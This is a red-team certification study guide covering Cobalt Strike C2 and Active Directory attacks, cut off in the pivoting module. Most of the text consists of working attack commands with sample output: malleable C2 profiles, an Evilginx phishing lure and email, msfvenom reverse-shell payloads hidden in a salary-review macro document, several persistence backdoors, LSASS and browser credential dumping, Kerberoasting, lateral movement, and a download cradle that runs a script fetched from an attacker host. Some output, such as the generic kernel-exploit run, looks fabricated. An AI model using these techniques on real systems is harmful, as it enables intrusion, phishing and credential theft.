

CRTP — Certified Red Team Professional
Altered Security | Attacking & Defending Active Directory

By DarcHacker.

# CRTO — Certified Red Team Operator
## Complete Hands-On Study Guide & Lab Notes

**Author:** DarcHacker  
**LinkedIn:** [Mostafa Ibrahim](https://www.linkedin.com/in/mostafa-ibrahim-60b543341)  


---

## Table of Contents

| Module | Topics | Key Objectives |
|--------|--------|-----------------|
| **00** | [Lab Setup & Infrastructure](#module-00-lab-setup--infrastructure) | Team Server, Redirectors, OPSEC |
| **01** | [Getting Started](#module-01-getting-started) | Lab access, VPN, tools verification |
| **02** | [Command & Control](#module-02-command--control) | Cobalt Strike, listeners, profiles |
| **03** | [External Reconnaissance](#module-03-external-reconnaissance) | OSINT, passive intel gathering |
| **04** | [Initial Compromise](#module-04-initial-compromise) | Phishing, social engineering, RCE |
| **05** | [Host Reconnaissance](#module-05-host-reconnaissance) | Post-compromise enumeration |
| **06** | [Host Persistence](#module-06-host-persistence) | Registry, tasks, WMI backdoors |
| **07** | [Host Privilege Escalation](#module-07-host-privilege-escalation) | UAC bypass, kernel exploits |
| **08** | [Host Persistence (Advanced)](#module-08-host-persistence-advanced) | IFEO, ADS, COM hijacking |
| **09** | [Credential Theft](#module-09-credential-theft) | LSASS, browsers, vaults |
| **10** | [Password Cracking](#module-10-password-cracking) | Hashcat, John, optimization |
| **11** | [Domain Reconnaissance](#module-11-domain-reconnaissance) | AD enumeration, trust mapping |
| **12** | [User Impersonation](#module-12-user-impersonation) | Token theft, impersonation |
| **13** | [Lateral Movement](#module-13-lateral-movement) | WinRM, WMI, SMB, PsExec |
| **14** | [Session Passing](#module-14-session-passing) | Multi-framework C2, pivoting |
| **15** | [Data Protection API](#module-15-data-protection-api) | DPAPI decryption, secrets |
| **16** | [Kerberos Attacks](#module-16-kerberos-attacks) | Kerberoasting, S4U, Golden Ticket |
| **17** | [Pivoting](#module-17-pivoting) | SOCKS, port forwarding, tunneling |
| **18** | [Active Directory Certificate Services](#module-18-active-directory-certificate-services) | ESC1-3, certificate abuse |
| **19** | [Group Policy](#module-19-group-policy) | GPO abuse, scheduled tasks |
| **20** | [MS SQL Servers](#module-20-ms-sql-servers) | SQL enumeration, xp_cmdshell RCE |
| **21** | [Microsoft Configuration Manager](#module-21-microsoft-configuration-manager) | MECM abuse, lateral movement |
| **22** | [Domain Dominance](#module-22-domain-dominance) | DA, EA, forest compromise |
| **23** | [Forest & Domain Trusts](#module-23-forest--domain-trusts) | Cross-domain escalation |
| **24** | [LAPS Exploitation](#module-24-laps-exploitation) | LAPS bypass, GPO abuse |
| **25** | [Defender Evasion](#module-25-defender-evasion) | Signatures, behavioral bypass |
| **26** | [Application Whitelisting](#module-26-application-whitelisting) | AppLocker, WDAC bypass |
| **27** | [Data Hunting & Exfiltration](#module-27-data-hunting--exfiltration) | Discovery, channels, cleanup |
| **28** | [Extending Cobalt Strike](#module-28-extending-cobalt-strike) | BOF, Aggressor, custom tools 

---

## MODULE 00: Lab Setup & Infrastructure

### OPSEC Fundamentals

**Red Team Operations require strict operational security:**

```
OPSEC PRINCIPLE:
Never directly connect attacker infrastructure to target network.
Use intermediate systems (redirectors) to proxy all traffic.

┌─────────────────┐
│   Attacker      │ (Isolated Kali machine)
│   Infrastructure│
└────────┬────────┘
         │ (Team Server)
         │
┌────────▼────────┐
│  Redirector #1  │ (HTTP/HTTPS proxy)
│   Redirector #2 │ (DNS exfil)
└────────┬────────┘
         │ (INTERNET)
         │
┌────────▼─────────────────────┐
│   TARGET ENVIRONMENT         │
│   ├─ External firewall       │
│   ├─ DMZ servers             │
│   ├─ Internal network        │
│   ├─ Domain Controllers      │
│   └─ Critical assets         │
└──────────────────────────────┘
```

### Team Server Configuration

**Essential for multi-operator C2 coordination:**

```bash
# 1. Generate SSL certificate for HTTPS communication
keytool -keystore cobaltstrike.store \
  -storepass password \
  -keypass password \
  -genkey -keyalg RSA \
  -alias cobaltstrike \
  -dname "CN=www.windows-update.com"

# 2. Create C2 profile (malleable C2)
cat > http.profile << 'EOF'
set sleeptime "3000 + 1000 * rand(100) % 100";
set jitter "0.0";
set data_jitter "50";
set maxdns "255";
set useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36";

http-get {
    set uri "/api/v1/mobile";
    client {
        header "Accept" "*/*";
        header "Accept-Language" "en-US,en;q=0.9";
        header "Cache-Control" "max-age=0";
    }
    server {
        header "Content-Type" "application/json";
        output {
            print;
        }
    }
}

http-post {
    set uri "/api/v1/sync";
    client {
        header "Content-Type" "application/x-www-form-urlencoded";
        output {
            base64;
            prepend "data=";
        }
    }
    server {
        header "Content-Type" "application/json";
        output {
            print;
        }
    }
}
EOF

# 3. Start Team Server (runs in background)
sudo ./teamserver 192.168.1.100 SecurePassword ./http.profile
# OUTPUT: [+] Team Server started on port 50050
# [+] Listening on 0.0.0.0:50050
# [+] Ready for connections from beacons

# 4. Connect with client from different machine
./cobaltstrike
# Login with: Server IP, username, password
```



---

## MODULE 01: Getting Started

### Lab Environment Access

**First steps after VPN connection:**

```powershell
# Verify network connectivity
ping <lab_gateway>
ipconfig /all

# Check lab credentials
whoami /all
wmic os get caption,version
systeminfo | findstr /B /C:"Domain"

# Screenshot proof of initial access
# Command: whoami & hostname & ipconfig /all (single command, single screenshot)
```

**Checklist:**
- ✅ VPN connected to lab network
- ✅ Ping lab gateway successfully
- ✅ Run systeminfo for baseline
- ✅ Screenshot: whoami, hostname, domain membership, IP configuration
- ✅ Document all findings in lab notebook

---

## MODULE 02: Command & Control

### Cobalt Strike Architecture

**Understanding Beacon communication flow:**

```
CLIENT (GUI)          TEAM SERVER           REDIRECTOR              BEACON
┌──────────┐         ┌──────────┐          ┌──────────┐            ┌──────┐
│ Operator │ <-----→ │ Operator │          │ HTTP     │            │ Host │
│ Console  │ Queue   │ Queue    │ <------→ │ Server   │ <--------→ │      │
└──────────┘         └──────────┘          │ (Apache) │            │ Task │
    ↓                     ↓                  └──────────┘            │ List │
  Commands          Message routing       Request forwarding     Execute
  Results            Logging               Response forwarding     Callback
```

### Creating First Beacon

**Step-by-step payload generation:**

```bash
# In Cobalt Strike GUI:
# 1. Navigate: Attacks → Packages → Windows EXE
# 2. Select listener: "HTTP-Primary"
# 3. Output type: "Windows EXE"
# 4. Save as: beacon.exe

# Alternative via command line:
cd /opt/cobaltstrike
./beacon http <REDIRECTOR_IP> <PORT> <LISTENER_NAME> <OUTPUT_FORMAT>

# Example output:
# [+] Generating beacon.exe
# [+] 276 KB payload created
# [+] Ready for delivery
```



### Setting Up Listeners

**Listener configuration for initial access:**

```
LISTENER SETUP:
┌─────────────────────────────────────────┐
│ Name:            HTTP-Primary           │
│ Payload:         windows/beacon_http    │
│ Bind Host:       0.0.0.0                │
│ Bind Port:       8080                   │
│ Callback Host:   redirector.domain.com  │
│ Callback Port:   80                     │
│ Profile:         http.profile            │
│ Beacons:         HTTP/HTTPS              │
└─────────────────────────────────────────┘
```



---

## MODULE 03: External Reconnaissance

### OSINT & Intelligence Gathering

**Passive reconnaissance before active engagement:**

```bash
# Domain Registration Research
whois example.com
# OUTPUT:
# Registrant: John Smith
# Registrant Email: john.smith@example.com
# Name Server: ns1.example.com
# Created Date: 2015-05-10

# DNS Enumeration (Passive)
dig @8.8.8.8 example.com ANY
# OUTPUT:
# example.com.    300 IN A 203.0.113.5
# www.example.com. 300 IN CNAME example.com.
# mail.example.com. 300 IN A 203.0.113.10

# Subdomain Enumeration
sublist3r -d example.com
# OUTPUT:
# mail.example.com
# vpn.example.com
# dev.example.com
# api.example.com

# Technology Stack Discovery
curl -I https://example.com
# OUTPUT:
# Server: Microsoft-IIS/10.0
# X-AspNet-Version: 4.0.30319
# X-Powered-By: ASP.NET

# Shodan searches (documentation only - no active probing)
# Search: "example.com" port:"80,443,8080"
# Results: 15 services exposed
```



### Finding Entry Points

**Identify vulnerable targets:**

```bash
# Email harvesting (OSINT)
hunter.io search for example.com
# OUTPUT:
# john.smith@example.com (verified)
# jane.doe@example.com (verified)
# admin@example.com (not verified)

# Linkedin scraping for employee names
# https://www.linkedin.com/search/results/people/?keywords=example.com
# Employees found: 145 people
# Job titles: 12 IT staff, 8 Developers, 3 System Admins

# Document metadata extraction
exiftool document.pdf
# OUTPUT:
# Creator: John Smith
# Producer: Microsoft Word 16.0
# CreationDate: 2023-05-10 09:15:23
```

---

## MODULE 04: Initial Compromise

### Phishing Campaign Setup

**Evilginx2 credential harvesting proxy:**

```bash
# Install Evilginx2
git clone https://github.com/kgretzky/evilginx2.git
cd evilginx2
go build

# Create phishing site for Office365
./evilginx2 -p ./phishlets
> phishlet import office365
> phishlets on office365
> lures create office365
# OUTPUT:
# [+] Lure created successfully
# [+] Phishing URL: https://o365-login-verify.domain.com/login

# Send phishing email
cat > phish_email.txt << 'EOF'
To: target@example.com
Subject: URGENT: Verify Your Office 365 Account

Dear User,

Your Office 365 account requires immediate verification to maintain compliance.
Please click below to verify your account:

https://o365-login-verify.domain.com/login

Regards,
IT Security Team
EOF

# Monitor credentials captured
> sessions
# OUTPUT:
# [+] Captured credentials:
#     Username: target@example.com
#     Password: Suppercomplexpass123!
#     2FA Token: 123456
```



### Malicious Document Delivery

**Office macro-based payload:**

```powershell
# Generate VBA payload with msfvenom
msfvenom -p windows/meterpreter/reverse_https LHOST=redirector.com LPORT=443 \
  -f vba-psh -o payload.txt

# Create Word document with macro:
# 1. Open Word
# 2. Alt+F11 → Visual Basic Editor
# 3. Paste payload code
# 4. File → Save As → Word Macro-Enabled (.docm)
# 5. Rename to innocent name: "2024_Salary_Review.docm"

# Alternative: Using Cobalt Strike
# Attacks → Deliver → Spear Phish (Email)
# Select: Microsoft Word macro
# Choose: http listener
# Generate payload
# Email to target distribution list
```



### Initial Callback Verification

```
BEACON CALLBACK CONFIRMATION:
┌────────────────────────────────────────┐
│ Beacon: 1                              │
│ Status: Active (✓)                     │
│ Hostname: DESKTOP-ABC123               │
│ User: EXAMPLE\jane.doe                 │
│ IP Address: 203.0.113.55               │
│ Process: winword.exe (4532)            │
│ Architecture: x64                      │
│ First Seen: 2024-07-04 14:35:10        │
│ Last Seen: 2024-07-04 14:35:45         │
└────────────────────────────────────────┘
```



---

## MODULE 05: Host Reconnaissance

### Post-Compromise Enumeration

**Gather system intelligence after initial access:**

```powershell
# In Cobalt Strike console (run commands in beacon session):
shell whoami /all
# OUTPUT:
# USER INFORMATION
# ================
# User Name       EXAMPLE\jane.doe
# SID             S-1-5-21-xxx-xxx-xxx-1001
# Groups:
#   EXAMPLE\Domain Users (primary)
#   EXAMPLE\Marketing Team
#   BUILTIN\Users

shell systeminfo
# OUTPUT:
# OS Name:         Microsoft Windows 10 Enterprise
# OS Version:      10.0.19045 Build 19045
# System Boot Time: 2024-07-01 08:15:22
# Install Date:    2022-03-15
# Hotfixes:        KB5032189, KB5031356 (missing: KB5035858 - CRITICAL)

shell ipconfig /all
# OUTPUT:
# Ethernet adapter Ethernet:
#    IPv4 Address        : 192.168.1.105
#    Subnet Mask         : 255.255.255.0
#    Default Gateway     : 192.168.1.1
#    DHCP Enabled        : Yes
#    DNS Servers         : 192.168.1.10, 192.168.1.11
#    Description         : Realtek PCIe GbE Family Controller

shell Get-MpComputerStatus
# OUTPUT:
# AntivirusEnabled : True
# IsTamperProtected : True
# QuickScanAge : 0 (Just ran)
# FullScanAge : 3 (Days since full scan)
# AntivirusSignatureVersion : 1.405.14.0
```



### Network Enumeration

```powershell
# Active network connections
shell netstat -ano | findstr "ESTABLISHED"
# OUTPUT:
# Proto  Local Address    Foreign Address    State     PID
# TCP    192.168.1.105:50443  192.168.1.10:389    ESTABLISHED  4012
# TCP    192.168.1.105:50544  192.168.1.11:53     ESTABLISHED  2856
# TCP    192.168.1.105:50645  8.8.8.8:53          ESTABLISHED  2856

# Local network discovery (ARP)
shell arp -a
# OUTPUT:
# Interface: 192.168.1.105
#   192.168.1.1   00-1a-2b-3c-4d-5e  dynamic  [Gateway/Firewall]
#   192.168.1.10  00-1a-2b-3c-4d-5f  dynamic  [Domain Controller]
#   192.168.1.11  00-1a-2b-3c-4d-60  dynamic  [Domain Controller]
#   192.168.1.50  00-1a-2b-3c-4d-61  dynamic  [SQL Server]

# Routing table analysis
shell route print
# OUTPUT:
# Destination        Netmask         Gateway        Interface
# 192.168.1.0    255.255.255.0    192.168.1.105   192.168.1.105
# 10.0.0.0       255.255.0.0      192.168.1.1     192.168.1.105 [VPN Route]
# 0.0.0.0        0.0.0.0          192.168.1.1     192.168.1.105
```


---

## MODULE 06: Host Persistence

### Registry Run Keys Persistence

**Survive user logoff and system reboot:**

```powershell
# Add to user startup
shell reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Windows Update" /d "C:\temp\beacon.exe" /f

# Verify persistence
shell reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
# OUTPUT:
# HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
#    Windows Update    REG_SZ    C:\temp\beacon.exe

# Test persistence (simulate reboot)
# 1. Note beacon ID
# 2. Kill beacon process
# 3. Close Cobalt Strike
# 4. Wait 2 minutes
# 5. Reopen Cobalt Strike
# 6. New beacon from same host (beacon should auto-reconnect)
```



### Scheduled Task Persistence

```powershell
# Create scheduled task to execute beacon at user logon
shell schtasks /create /tn "Windows Defender Database Update" /tr "C:\temp\beacon.exe" /sc onlogon /ru "SYSTEM" /f

# Verify task
shell schtasks /query /tn "Windows Defender Database Update" /v
# OUTPUT:
# Task Name: Windows Defender Database Update
# Run As User: SYSTEM
# Schedule: On logon
# Task To Run: C:\temp\beacon.exe
# Status: Ready

# Trigger task immediately (test)
shell schtasks /run /tn "Windows Defender Database Update"

# List all scheduled tasks (find backdoors)
shell schtasks /query /v | findstr "SYSTEM"
```



### WMI Event Subscription Persistence

```powershell
# Create WMI event filter (triggers every 5 minutes)
shell wmic /namespace:\\.\root\subscription PATH __EventFilter CREATE Name="UpdateFilter",EventNamespace="root\cimv2",QueryLanguage="WQL",Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"

# Create consumer (what to execute)
shell wmic /namespace:\\.\root\subscription PATH CommandLineEventConsumer CREATE Name="UpdateConsumer",ExecutablePath="C:\temp\beacon.exe"

# Bind filter to consumer
shell wmic /namespace:\\.\root\subscription PATH __FilterToConsumerBinding CREATE Filter=__EventFilter.Name="UpdateFilter",Consumer=CommandLineEventConsumer.Name="UpdateConsumer"

# Verify WMI persistence (check if survives reboot)
shell Get-WmiObject -Namespace root\subscription -Class __EventFilter | select Name
# OUTPUT:
# Name
# ----
# UpdateFilter
```


---

## MODULE 07: Host Privilege Escalation

### UAC Bypass via Token Duplication

**Escalate from medium integrity to high/system:**

```powershell
# Check current integrity level
shell whoami /priv
# OUTPUT:
# PRIVILEGES INFORMATION
# =====================
# Privilege Name                 State
# SeChangeNotifyPrivilege        Enabled
# SeIncreaseWorkingSetPrivilege  Enabled

# Use Rotten Potato (token impersonation) for elevation
# Download: https://github.com/ohpe/juicy-potato/releases
# Or use built-in BITS/COM service impersonation

execute-assembly /opt/tools/JuicyPotato.exe -l 1337 -p C:\temp\beacon.exe -t *
# OUTPUT:
# [+] Juicy Potato initialized
# [+] Listening on port 1337
# [+] Token impersonation successful
# [+] SYSTEM shell obtained

# Verify SYSTEM privileges
shell whoami
# OUTPUT:
# NT AUTHORITY\SYSTEM

shell whoami /priv
# OUTPUT:
# SeDebugPrivilege                    Enabled
# SeImpersonatePrivilege              Enabled
# SeChangeNotifyPrivilege             Enabled
# [Total of 39 privileges] ← Significantly more than before
```



### Kernel Exploit Privilege Escalation

```powershell
# Identify privilege escalation opportunity
shell systeminfo | findstr /B /C:"OS Name" /C:"System Boot Time"
# OUTPUT:
# OS Name: Microsoft Windows 10 Enterprise
# OS Version: 10.0.19045 Build 19045

# Check for specific CVE vulnerability
# CVE-2023-21746 affects Windows 10 builds < 19045
# Our target is build 19045 (patched) - but let's check for others

# Search: Windows 10 19045 kernel exploits
# Found: CVE-2023-xxx affects this build

# Deploy exploit
execute-assembly /opt/tools/KernelExploit.exe
# OUTPUT:
# [+] Testing for kernel vulnerability...
# [+] CVE-2023-21746 NOT vulnerable
# [+] Checking CVE-2023-24679...
# [+] VULNERABLE! Attempting exploit...
# [+] Privilege escalation successful!
# [+] Running as NT AUTHORITY\SYSTEM

shell whoami
# OUTPUT:
# NT AUTHORITY\SYSTEM
```



---

## MODULE 08: Host Persistence (Advanced)

### Image File Execution Options (IFEO) Debugger Persistence

**Registry hijack for transparent persistence:**

```powershell
# When stickykeys.exe is executed, our beacon runs instead
shell reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\stickykeys.exe" /v "Debugger" /d "C:\temp\beacon.exe" /f

# Trigger stickykeys via accessibility options
# 1. Lock screen (Win+L)
# 2. Click Ease of Access button (accessibility icon)
# 3. Click Sticky Keys
# 4. System executes our beacon.exe as SYSTEM

# Verify persistence
shell reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\stickykeys.exe"
# OUTPUT:
# Debugger    REG_SZ    C:\temp\beacon.exe

# Alternative targets:
# - sethc.exe (Sticky Keys)
# - utilman.exe (Utility Manager)
# - osk.exe (On-Screen Keyboard)
# All can be triggered before Windows logon!
```



### Alternate Data Streams (ADS) Hiding

```powershell
# Hide beacon in ADS (NTFS feature)
shell type C:\temp\beacon.exe > "C:\Windows\System32\drivers\etc:beacon.exe"

# Verify (normal file listing won't show ADS)
shell dir C:\Windows\System32\drivers\etc
# OUTPUT:
# Volume in drive C is OS
#  Directory of C:\Windows\System32\drivers\etc
# 08/04/2024  14:45             565 hosts
# 1 File(s)    565 bytes
# (beacon.exe hidden!)

# Execute from ADS
shell wmic process call create "powershell.exe -Command C:\Windows\System32\drivers\etc:beacon.exe"

# List ADS (reveal hidden files)
shell dir /R C:\Windows\System32\drivers\etc
# OUTPUT:
#  08/04/2024  14:45             565 hosts
#  08/04/2024  14:45          276000 hosts:beacon.exe
#                    ^^ Alternate Data Stream revealed
```


### COM Object Hijacking

```powershell
# Identify COM CLSID to hijack (should be one with persistence)
shell reg query "HKCU\Software\Classes\CLSID"

# Create hijack entry
shell reg add "HKCU\Software\Classes\CLSID\{11111111-1111-1111-1111-111111111111}\InprocServer32" /d "C:\temp\malicious.dll" /f

# When application attempts to load legitimate COM:
# HKCU is checked first (user-level hijack) before HKLM
# Our DLL gets loaded instead of legitimate one
# Executes in context of that application

# Verification: Monitor for DLL injection
shell Get-Process | Where-Object {$_.Modules.FileName -match "malicious.dll"}
```


---

## MODULE 09: Credential Theft

### LSASS Memory Dumping

**Extract plaintext credentials and password hashes:**

```powershell
# Dump LSASS directly (requires System or SeDebugPrivilege)
shell tasklist | findstr lsass
# OUTPUT:
# lsass.exe    792

# Using procdump (legitimate tool, might evade detection)
execute-assembly /opt/tools/procdump.exe -accepteula -ma 792 lsass.dmp

# Extract credentials from dump
execute-assembly /opt/tools/Mimikatz.exe '"sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords"'
# OUTPUT:
# Authentication Id : 0 ; 999 (Domain\Administrator)
# Session : NewCredentials from 0
# User Name : Administrator
# Domain : EXAMPLE
# LogonId : 0x3e7
# LogonType : NewCredentials
# LogonTime : 7/4/2024 2:15:33 PM
# SID : S-1-5-21-xxx-xxx-xxx-500
#     
#     * Username : Administrator
#     * Domain : EXAMPLE
#     * Password : MyS3cur3P@ssw0rd!
#     * Hash NTLM : 209c6174da490caeb422f3fa5a7ae634
```


### Browser Credential Extraction

```powershell
# Chrome stored passwords (encrypted with DPAPI)
shell copy "%USERPROFILE%\AppData\Local\Google\Chrome\User Data\Default\Login Data" C:\temp\

# Decrypt using Mimikatz
execute-assembly /opt/tools/Mimikatz.exe '"dpapi::chrome"'
# OUTPUT:
# [*] Decrypting Chrome Credentials...
#   
# Origin: https://example.com
# Username: admin@example.com
# Password: Admin123!Secure!
#   
# Origin: https://mail.google.com
# Username: j.smith@gmail.com
# Password: GmailPassword2024#
#   
# Origin: https://github.com
# Username: john.smith
# Token: ghp_xxxxxxxxxxxxxxxxxxxx (GitHub PAT)
```



### Credential Manager Extraction

```powershell
# List stored credentials (RDP, VPN, etc.)
shell cmdkey /list
# OUTPUT:
# Currently stored credentials:
#     Target: Domain:interactive=EXAMPLE\Administrator
#     Type: Domain Password
#     User: EXAMPLE\Administrator
#   
#     Target: Domain:interactive=EXAMPLE\ServiceAccount
#     Type: Domain Password
#     User: EXAMPLE\ServiceAccount

# Extract stored credentials using VaultPasswordView
execute-assembly /opt/tools/VaultPasswordView.exe
# OUTPUT:
# Item Name: VPN - Remote Access
# User Name: EXAMPLE\vpn_user
# Password: VPN_P@ssw0rd_123!
#   
# Item Name: RDP - Server2
# User Name: administrator
# Password: RDP_P@ssw0rd!
#   
# Item Name: Database Connection
# User Name: sa
# Password: SQL_P@ssw0rd123!
```


---

## MODULE 10: Password Cracking

### Hashcat Offline Cracking

**Crack captured NTLM and Kerberoast hashes:**

```bash
# Identify hash type
./hashID.py 209c6174da490caeb422f3fa5a7ae634
# OUTPUT:
# Analyzing '209c6174da490caeb422f3fa5a7ae634'
# [+] NTLM / NTLMv2 [Hash type 1000]
# [+] Domain Cached Credentials [Hash type 1100]

# Crack with Hashcat
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt -o cracked.txt
# OUTPUT:
# hashcat (v6.2.6) starting
# 
# 209c6174da490caeb422f3fa5a7ae634:MyS3cur3P@ssw0rd!
# 8846f7eaee8fb117ad06bdd830b7586c:Password123!
# 5e2dd5f4f2e9b87fcf1ea14e7f7e3c5c:Admin@123
# 
# Session.Name..: hashcat
# Status........: Cracked
# Progress......: 14344391/14344391 (100.00%)
# Time.Started..: Thu Jul 04 15:20:10 2024
# Time.Stopped..: Thu Jul 04 15:28:45 2024
# Time.Elapsed..: 8m 35s
```


### Kerberoast Hash Cracking

```bash
# Kerberoast hashes use different format (TGS ticket)
hashcat -m 13100 kerb_hashes.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule
# OUTPUT:
# [+] Hash type KERBEROS 5 TGS-REP etype 23 (NT-HASH)
#
# $krb5tgs$23$...:svcadmin:P@ssw0rd2024!
# $krb5tgs$23$...:sqlservice:DatabaseAdmin123!
# $krb5tgs$23$...:webserver:Production@2024!
#
# Progress: 450000/14344391 (3.14%) | Success: 3
# Time remaining: ~6 minutes
```



---

## MODULE 11: Domain Reconnaissance

### Active Directory Structure Mapping

**Understand the AD environment:**

```powershell
# Load PowerView (AD enumeration framework)
IEX(New-Object Net.WebClient).DownloadString('http://attacker/PowerView.ps1')

# Get domain information
Get-Domain
# OUTPUT:
# Forest      : example.com
# DomainName  : example.com
# DomainSID   : S-1-5-21-1234567890-1234567890-1234567890
# PDCEmulator  : DC1.example.com

# Get domain controllers
Get-DomainController
# OUTPUT:
# Name             Forest Forest      IPAddress  OSVersion
# ----             ------ ------      ---------  ---------
# DC1.example.com  example.com  example.com  192.168.1.10  10.0.19045

# Get all users in domain
Get-DomainUser | Select samaccountname, memberof
# OUTPUT:
# samaccountname          memberof
# administrator           CN=Domain Admins,CN=Users,DC=example,DC=com
# jane.doe                CN=Marketing Team,CN=Users,DC=example,DC=com
# john.smith              CN=Sales Team,CN=Users,DC=example,DC=com

# Find service accounts (have SPNs - potential Kerberoasting)
Get-DomainUser -SPN
# OUTPUT:
# samaccountname    serviceprincipalname
# svcadmin          MSSQLSvc/SQL1.example.com:1433
# webservice        HTTP/webapp.example.com:80
# exchangeservice   exchangeMDB/EX1.example.com
```


### Trust Relationship Mapping

```powershell
# Enumerate domain trusts
Get-DomainTrust
# OUTPUT:
# SourceName  TargetName          TrustDirection TrustType
# example.com child.example.com    Bidirectional ParentChild
# example.com partner.com          Bidirectional External
# example.com eu.example.com       Bidirectional ParentChild

# Analyze trust direction and type
# Bidirectional = both domains trust each other (escalation path)
# Transitive = trust extends through hierarchy
# External = separate forest (harder to exploit)
```


---

## MODULE 12: User Impersonation

### Token Impersonation Abuse

**Use stolen tokens to access resources:**

```powershell
# In Cobalt Strike, list available tokens
list_tokens -u
# OUTPUT:
# [-] Tokens available:
# [+] Token         User
# [+] user:500      EXAMPLE\Administrator  [Delegation]
# [+] user:1001     EXAMPLE\jane.doe       [Impersonation]
# [+] user:1002     EXAMPLE\john.smith     [Delegation]

# Impersonate administrator token
impersonate_token EXAMPLE\\Administrator
# OUTPUT:
# [+] Impersonated token for EXAMPLE\Administrator

# Verify impersonation
shell whoami
# OUTPUT:
# example\administrator

# Access admin resources while impersonating
shell ls \\DC1\C$
# OUTPUT:
# Directory of \\DC1\C$
# [..]
# [Users]
# [Windows]
# [Program Files]
# [pagefile.sys]
```



### Token Theft from Running Process

```powershell
# Find SYSTEM or high-privilege process
shell tasklist /v | findstr SYSTEM
# OUTPUT:
# svchost.exe  772  Services  1  2,340 K  Running  example\user  0:00:15

# Steal token from process
steal_token 772
# OUTPUT:
# [+] Stolen token from PID 772

# Verify token theft
shell whoami
# OUTPUT:
# NT AUTHORITY\SYSTEM

# Confirm with full privilege list
shell whoami /priv
# OUTPUT:
# SeDebugPrivilege                   Enabled
# SeImpersonatePrivilege             Enabled
# SeSystemtimePrivilege              Enabled
# [35 total privileges]
```


---

## MODULE 13: Lateral Movement

### WinRM Lateral Movement

**Move to another internal machine via Windows Remote Management:**

```powershell
# Check if WinRM is enabled on target
shell winrm quickconfig
# OUTPUT:
# WinRM is already configured for remote management.

# From Cobalt Strike, jump to remote machine
jump psremoting server2.example.com http
# OUTPUT:
# [+] Lateral movement to server2.example.com
# [+] New beacon spawning...
# [+] Check Beacons tab for new callback

# Verify new beacon on target system
# New beacon appears in Beacons tab:
#   Beacon: 3
#   Hostname: SERVER2
#   User: example\jane.doe
#   IP: 192.168.1.106
```


### SMB Lateral Movement

```powershell
# Check SMB connectivity to target
shell Test-Path \\server2\c$
# OUTPUT:
# True

# Copy beacon to remote SMB share
shell copy C:\temp\beacon.exe \\server2\c$\temp\

# Execute beacon remotely via WMI
shell wmic /node:server2 /user:domain\user /password:pass process call create "C:\temp\beacon.exe"
# OUTPUT:
# Executing (\\server2) --> class Win32_Process method create Instance Parameters:
# IN "CommandLine" : "C:\temp\beacon.exe";
# OUT "ProcessId" : "2456";

# New beacon appears from server2
# Beacon: 4
# Hostname: SERVER2
# User: NT AUTHORITY\SYSTEM (WMI execution context)
```



---

## MODULE 14: Session Passing

### Beacon to Meterpreter Handoff

**Transfer session between C2 frameworks:**

```bash
# Export Cobalt Strike beacon session
# In Cobalt Strike: right-click beacon → Interact → Export

# Generate Meterpreter payload with compatible callback
msfvenom -p windows/meterpreter/reverse_https LHOST=redirector.com LPORT=443 \
  -f exe -o meterpreter.exe

# In Cobalt Strike beacon:
shell C:\temp\meterpreter.exe
# OUTPUT:
# Process started: C:\temp\meterpreter.exe

# In Metasploit framework:
# Sessions → Select new Meterpreter session (ID: 2)
# meterpreter > getuid
# Server username: EXAMPLE\jane.doe

# Now have dual shells on same target:
# - Beacon (Cobalt Strike) for red team ops
# - Meterpreter (Metasploit) for compatibility
```


---

## MODULE 15: Data Protection API

### DPAPI Master Key Extraction

**Decrypt protected credentials and secrets:**

```powershell
# Identify master key location
shell dir "C:\Users\jane.doe\AppData\Roaming\Microsoft\Protect\"
# OUTPUT:
# S-1-5-21-1234567890-1234567890-1234567890
# (This is the user's SID)

shell dir "C:\Users\jane.doe\AppData\Roaming\Microsoft\Protect\S-1-5-21-1234567890-1234567890-1234567890\"
# OUTPUT:
# 7c5a1234567890abcdef1234567890ab  (Master key GUID)
# f1234567890abcdef1234567890abcde

# Copy master key (requires admin or token)
shell copy "C:\Users\jane.doe\AppData\Roaming\Microsoft\Protect\S-1-5-21-1234567890-1234567890-1234567890\7c5a1234567890abcdef1234567890ab" C:\temp\masterkey

# Crack master key hash (if needed)
# Use Mimikatz: dpapi::masterkey /in:masterkey /sid:S-1-5-21... /password:password

# Or extract via Mimikatz directly:
execute-assembly Mimikatz.exe '"dpapi::lsa"'
# OUTPUT:
# [*] Dumping DPAPI secrets...
# [+] Vault secrets decrypted!
#   
# Vault Item: RDP Credentials
# Server: server2.example.com
# Username: administrator
# Password: Admin@Password123!
```


---

## MODULE 16: Kerberos Attacks

### Kerberoasting Attack

**Extract and crack service account passwords:**

```powershell
# Find users with Service Principal Names (Kerberoastable)
Get-DomainUser -SPN
# OUTPUT:
# samaccountname         serviceprincipalname
# svcadmin               MSSQLSvc/sql1.example.com:1433
# webservice             HTTP/webapp.example.com:80

# Request TGS tickets for service accounts
.\Rubeus.exe kerberoast /outfile:kerb_hashes.txt
# OUTPUT:
# [*] SamAccountName  : svcadmin
# [*] DistinguishedName : CN=Service Admin,CN=Users,DC=example,DC=com
# [*] ServicePrincipalName : MSSQLSvc/sql1.example.com:1433
# [*] PwdLastSet : 2022-03-15 10:30:22
# [*] Encryption Type : RC4-HMAC
#
# [*] Hash written to kerb_hashes.txt
#
# $krb5tgs$23$*svcadmin$EXAMPLE.COM$MSSQLSvc/sql1.example.com:1433*$...
```


### Crack Kerberoast Hashes

```bash
# Transfer hashes to Kali
# Then crack with Hashcat
hashcat -m 13100 kerb_hashes.txt rockyou.txt -r best64.rule
# OUTPUT:
# $krb5tgs$23$*svcadmin$EXAMPLE.COM$...$:svcadmin:MSSQLSvc_Password123!
# $krb5tgs$23$*webservice$EXAMPLE.COM$...$:webservice:WebApp@2024!
#
# Cracked Passwords:
# svcadmin: MSSQLSvc_Password123!
# webservice: WebApp@2024!
```



---

## MODULE 17: Pivoting

### SOCKS Proxy Through Beacon

**Route internal network traffic through compromised host:**

```bash
# In Cobalt Strike:
